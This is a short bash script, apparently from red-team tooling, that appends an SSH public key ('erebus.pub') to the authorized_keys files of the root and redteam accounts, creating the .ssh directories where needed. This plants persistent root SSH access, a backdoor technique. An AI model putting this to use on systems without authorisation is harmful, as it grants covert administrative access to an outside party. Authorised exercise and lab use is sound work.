USERS=(root redteam)

for user in "${USERS[@]}"; do
    home_dir="$(getent passwd $user | awk -F: '{print $6}')"
    if [[ -z $home_dir ]]; then
        continue
    fi
    sshdir="$home_dir/.ssh"
    auth_keys="$sshdir/authorized_keys"

    if sudo test -f $auth_keys; then
        sudo grep -q "AAAAC3NzaC1lZDI1NTE5AAAAIAbsgQ9t5uKNgyDtQ7IEeJcIkQ6ShMWmjXLev0R+KRID" "$auth_keys" && continue
    fi

    if ! sudo test -d "$sshdir"; then
        sudo mkdir -p "$sshdir"
        sudo chown "$user:$(id -gn $user)" "$sshdir"
    fi

    if [[ ! -f "$auth_keys" ]]; then
        sudo touch "$auth_keys"
        sudo chown "$user:$(id -gn $user)" "$auth_keys"
    fi

    sudo cat ssh_keys/erebus.pub | sudo tee -a "$auth_keys"
done
